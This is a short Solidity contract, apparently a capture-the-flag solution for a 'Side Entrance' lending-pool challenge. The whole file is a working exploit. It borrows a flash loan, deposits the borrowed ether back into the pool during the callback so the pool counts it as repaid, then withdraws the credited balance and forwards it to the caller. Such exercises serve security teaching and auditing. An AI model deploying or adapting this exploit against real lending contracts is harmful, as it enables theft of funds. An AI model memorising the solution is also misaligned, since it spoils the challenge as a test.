// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable public receiver;

    constructor(address _pool) {
        sideEntranceLenderPool = SideEntranceLenderPool(_pool);
    }

    function attack(uint256 amount) external {
        sideEntranceLenderPool.flashLoan(amount);
    }

    function withdraw() external payable {
        receiver = payable(msg.sender);
        sideEntranceLenderPool.withdraw();
    }

    function execute() external payable {
        sideEntranceLenderPool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        receiver.transfer(address(this).balance);
    }
}
